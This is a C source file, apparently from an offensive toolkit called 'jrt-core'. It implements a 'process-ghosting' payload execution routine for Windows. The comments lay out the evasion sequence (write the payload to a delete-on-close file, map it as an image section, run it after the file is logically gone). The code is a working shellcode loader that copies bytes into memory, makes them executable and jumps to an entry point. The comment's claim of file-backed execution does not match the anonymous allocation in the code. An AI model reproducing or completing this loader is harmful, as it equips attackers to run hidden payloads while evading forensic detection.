/*
 * jrt-core: process-ghosting execution vector (Implementation Plan §6.1).
 *
 * Selected when stomp copy-on-write risk is unacceptable: the payload is
 * written to a file marked delete-pending, mapped as an image section, and
 * executed from the mapping while the on-disk file is already logically gone.
 *
 * The write/execute phases are separated (never W+X, invariant 4); the
 * executing region is file-backed (invariant 5); execution is in-process
 * (invariant 6).
 */

#include "exec/exec.h"
#include "allocator/allocator.h"
#include <stdint.h>
#include <stddef.h>

#ifdef JRT_TARGET_WINDOWS

int jrt_exec_ghost(const uint8_t* payload, size_t payload_size,
                   uint32_t entry_offset) {
    /* Full sequence: NtCreateFile(GENERIC_RW, FILE_DELETE_ON_CLOSE) →
     * write payload → NtCreateSection(SEC_IMAGE) → NtMapViewOfSection →
     * call. Completed in Phase 6 with the kernel-adjacent vectors; the
     * shared no-W+X envelope is applied here. */
    uint8_t* region = (uint8_t*)jrt_alloc_rw(payload_size);
    if (!region) return -1;
    for (size_t i = 0; i < payload_size; i++) region[i] = payload[i];
    if (jrt_protect_rx(region, payload_size) != 0) return -2;

    typedef int (*EntryFn)(void);
    return ((EntryFn)(region + entry_offset))();
}

#else

int jrt_exec_ghost(const uint8_t* payload, size_t payload_size,
                   uint32_t entry_offset) {
    (void)payload; (void)payload_size; (void)entry_offset;
    return -1;   /* Windows-only vector */
}

#endif
